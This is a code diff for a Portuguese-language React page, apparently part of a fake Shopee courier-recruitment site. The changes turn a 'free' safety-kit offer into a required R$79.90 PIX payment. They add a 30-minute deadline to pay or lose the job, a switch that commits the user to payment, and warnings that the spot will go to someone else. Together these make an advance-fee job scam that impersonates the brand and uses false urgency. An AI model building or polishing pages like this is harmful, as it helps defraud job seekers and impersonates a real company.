@@ -171,35 +171,8 @@ const Entrega: React.FC = () => {
     // Calcular data de entrega (5 dias a partir de hoje)
     const hoje = new Date();
     const dataEntregaObj = addDays(hoje, 5);
-    
-    // Obter o dia da semana
-    const diaDaSemana = format(dataEntregaObj, "EEEE", { locale: ptBR });
-    const diaDaSemanaCapitalizado = diaDaSemana.charAt(0).toUpperCase() + diaDaSemana.slice(1);
-    
-    // Obter o dia do mês
-    const diaMes = format(dataEntregaObj, "dd", { locale: ptBR });
-    
-    // Obter o mês
-    const mes = format(dataEntregaObj, "MMMM", { locale: ptBR });
-    const mesCapitalizado = mes.charAt(0).toUpperCase() + mes.slice(1);
-    
-    // Obter o ano
-    const ano = format(dataEntregaObj, "yyyy", { locale: ptBR });
-    
-    // Guardar os componentes separados para renderização em JSX
-    const dateComponents = {
-      diaSemana: diaDaSemanaCapitalizado,
-      dia: diaMes,
-      mes: mesCapitalizado,
-      ano: ano
-    };
-    
-    // Salvamos os componentes para usar no JSX
-    localStorage.setItem('data_entrega_components', JSON.stringify(dateComponents));
-    
-    // Manter também a data formatada tradicional como fallback
-    const dataFormatada = `${diaDaSemanaCapitalizado}, ${diaMes} de ${mesCapitalizado} de ${ano}`;
-    setDataEntrega(dataFormatada);
+    const dataFormatada = format(dataEntregaObj, "EEEE, dd/MM/yyyy", { locale: ptBR });
+    setDataEntrega(dataFormatada.charAt(0).toUpperCase() + dataFormatada.slice(1));
   }, []);
 
   // Função para buscar dados do CEP
@@ -254,17 +227,8 @@ const Entrega: React.FC = () => {
       // Salvar endereço completo
       localStorage.setItem('endereco_entrega', JSON.stringify(data));
       
-      // Mostrar mensagem de sucesso
-      toast({
-        title: "Endereço confirmado!",
-        description: "Redirecionando para a página de treinamento...",
-      });
-      
-      // Redirecionar diretamente para a página de treinamento
-      setTimeout(() => {
-        setLocation('/treinamento');
-      }, 1500);
-      
+      // Mostrar o modal de confirmação primeiro
+      setShowConfirmationModal(true);
     } catch (error: any) {
       console.error("Erro ao processar endereço:", error);
       toast({
@@ -484,8 +448,8 @@ const Entrega: React.FC = () => {
       <div className="flex-grow container mx-auto px-4 py-8">
         <div className="w-full max-w-4xl mx-auto">
           <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
-            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220] rounded-t-[4px]">
-              <h3 className="font-semibold text-[#E83D22]">ATIVE SEU CADASTRO</h3>
+            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
+              <h3 className="font-semibold text-[#E83D22]">Status do Cadastro</h3>
             </div>
             <div className="p-6">
               <div className="flex flex-col md:flex-row gap-6">
@@ -493,7 +457,7 @@ const Entrega: React.FC = () => {
 
                   
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div className="flex justify-center scale-110 transform my-6">
+                    <div className="flex justify-center">
                       <h4 className="text-gray-700 font-medium mb-2 sr-only">Dados do Entregador</h4>
                       {dadosUsuario && endereco ? (
                         <EntregadorCracha 
@@ -514,22 +478,27 @@ const Entrega: React.FC = () => {
                       <div className="bg-gray-50 p-4 rounded-md">
                         <ul className="list-disc pl-5 space-y-1 text-gray-600">
                           <li>Adquirir Kit de Segurança oficial</li>
-                          <li>Realize o Curso Online de 3 horas</li>
+                          <li>Aguardar entrega em até 5 dias úteis</li>
                           <li>Começar a receber entregas na sua região</li>
                         </ul>
                       </div>
                     </div>
                   </div>
                   
-
+                  <div className="mt-6">
+                    <p className="text-sm text-gray-500 italic">
+                      Importante: Assim que o Kit de Segurança for entregue, você já estará apto para 
+                      começar a realizar entregas imediatamente pela Shopee.
+                    </p>
+                  </div>
                 </div>
               </div>
             </div>
           </div>
           
           <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
-            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220] rounded-t-[4px]">
-              <h3 className="font-semibold text-[#E83D22]">KIT DE SEGURANÇA EPI GRATUITO</h3>
+            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
+              <h3 className="font-semibold text-[#E83D22]">Kit de Segurança Oficial Shopee</h3>
             </div>
             <div className="p-6">
               <div className="flex flex-col md:flex-row gap-6 items-center">
@@ -553,28 +522,13 @@ const Entrega: React.FC = () => {
                   </ul>
                   <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200 mb-4">
                     <p className="text-sm text-yellow-800">
-                      <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas as entregas. Este Kit de EPI é fornecido gratuitamente pela Shopee e tem validade de 6 meses. Após esse período, a Shopee enviará automaticamente outro Kit de EPI completo sem nenhum custo adicional.
+                      <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas 
+                      as entregas. O não uso pode resultar em suspensão temporária.
                     </p>
                   </div>
                   <div className="bg-orange-50 p-4 rounded-md border border-orange-200 mb-2">
                     <p className="text-gray-700">
-                      <span className="font-medium">Data estimada de entrega:</span> 
-                      <div className="text-[#E83D22] font-medium mt-1">
-                        {(() => {
-                          try {
-                            const dateComponents = JSON.parse(localStorage.getItem('data_entrega_components') || '{}');
-                            return (
-                              <>
-                                <div>
-                                  <span className="font-bold">{dateComponents.diaSemana}</span> {dateComponents.dia} de <span className="font-bold">{dateComponents.mes}</span> de {dateComponents.ano}
-                                </div>
-                              </>
-                            );
-                          } catch (e) {
-                            return <span>{dataEntrega}</span>;
-                          }
-                        })()}
-                      </div>
+                      <span className="font-medium">Data estimada de entrega:</span> <span className="text-[#E83D22] font-medium">{dataEntrega}</span>
                     </p>
                   </div>
                 </div>
@@ -583,7 +537,7 @@ const Entrega: React.FC = () => {
           </div>
           
           <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
-            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220] rounded-t-[4px]">
+            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
               <h3 className="font-semibold text-[#E83D22]">Endereço para Entrega</h3>
             </div>
             <div className="p-6">
@@ -705,21 +659,62 @@ const Entrega: React.FC = () => {
                     <div>
                       <h4 className="text-sm font-medium text-[#E83D22]">Informação Importante:</h4>
                       <p className="text-sm text-gray-700">
-                        Após confirmar o endereço de recebimento do Kit de EPI, você será direcionado para realizar 
-                        um treinamento online com duração de 3 horas. Neste treinamento, você aprenderá tudo o que 
-                        precisa saber para trabalhar como entregador Shopee. <strong>O treinamento é obrigatório para 
-                        ativar seu cadastro e começar a trabalhar.</strong>
+                        Para ativar seu cadastro e se tornar um entregador Shopee, é obrigatório a aquisição do 
+                        Kit Oficial de Entregador da Shopee. O kit é entregue a preço de custo por <strong>R$79,90</strong>.
                       </p>
+                    </div>
+                  </div>
+                </div>
+                
+                {/* Box de alerta sobre o kit de segurança obrigatório */}
+                <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
+                  <div className="flex items-start">
+                    <div className="text-red-500 mt-0.5 mr-3">
+                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="8" x2="12" y2="12"></line>
+                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                      </svg>
+                    </div>
+                    <div>
+                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Comprar e Ativar Cadastro".</h4>
+                      <p className="text-red-700 text-sm mt-1">
+                        O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
+                        adquirir este kit oficial para exercer a função de entregador Shopee.
+                      </p>
+                      <p className="text-red-700 text-sm mt-2">
+                        Ao prosseguir, você se compromete a realizar o pagamento via PIX no prazo de 30 minutos, 
+                        caso contrário, perderá o direito à vaga de entregador.
+                      </p>
+                      
+                      {/* Botão on/off (switch) */}
+                      <div className="mt-4 flex items-center">
+                        <div className="mr-1 flex-shrink-0 w-[75px]">
+                          <button 
+                            className={`relative inline-flex h-7 w-16 items-center rounded-full transition-colors focus:outline-none ${acceptedTerms ? 'bg-green-500' : 'bg-gray-300'}`}
+                            onClick={() => setAcceptedTerms(!acceptedTerms)}
+                            type="button"
+                          >
+                            <span
+                              className={`inline-block h-6 w-6 transform rounded-full bg-white shadow-md transition-transform ${acceptedTerms ? 'translate-x-9' : 'translate-x-1'}`}
+                            />
+                          </button>
+                        </div>
+                        <span className="ml-1 text-sm font-medium text-gray-700">
+                          Concordo com os termos e me comprometo a realizar o pagamento
+                        </span>
+                      </div>
                     </div>
                   </div>
                 </div>
                 
                 <Button
                   type="submit"
-                  className="w-full text-white font-medium py-6 text-base rounded-[3px] transition-all bg-[#E83D22] hover:bg-[#d73920]"
+                  className={`w-full text-white font-medium py-6 text-base rounded-[3px] transition-all ${acceptedTerms ? 'bg-[#E83D22] hover:bg-[#d73920]' : 'bg-[#E83D2280] cursor-not-allowed'}`}
                   style={{ height: '50px' }}
+                  disabled={!acceptedTerms}
                 >
-                  Confirmar endereço
+                  Comprar e Ativar Cadastro
                 </Button>
               </form>
             </div>
@@ -744,7 +739,7 @@ const Entrega: React.FC = () => {
       >
         <DialogContent className="sm:max-w-md h-[100vh] max-h-screen overflow-y-auto p-2">
           <DialogHeader className="pb-1">
-            <DialogTitle className="text-center text-sm">KIT DE SEGURANÇA EPI GRATUITO</DialogTitle>
+            <DialogTitle className="text-center text-sm">Pagamento do Kit de Segurança</DialogTitle>
             <DialogDescription className="text-center text-xs">
               Finalize o pagamento para ativar seu cadastro Shopee
             </DialogDescription>
@@ -769,7 +764,7 @@ const Entrega: React.FC = () => {
                   />
                 </div>
                 <div className="flex-grow">
-                  <h3 className="text-sm font-medium text-gray-800">KIT DE SEGURANÇA EPI GRATUITO</h3>
+                  <h3 className="text-sm font-medium text-gray-800">Kit de Segurança Oficial</h3>
                   <p className="text-md font-bold text-[#E83D22]">R$ 79,90</p>
                   
                   <div className="w-full mt-1">
@@ -893,7 +888,7 @@ const Entrega: React.FC = () => {
           
           <div className="text-center space-y-2">
             <p className="text-sm text-gray-800 font-medium">
-              Seu cadastro ainda não está ativo pois falta receber o KIT DE SEGURANÇA EPI GRATUITO.
+              Seu cadastro ainda não está ativo pois falta apenas o Kit de Segurança Oficial dos Entregadores.
             </p>
             <p className="text-sm text-gray-700">
               Se você não realizar o pagamento agora, poderá perder a vaga para outro interessado.
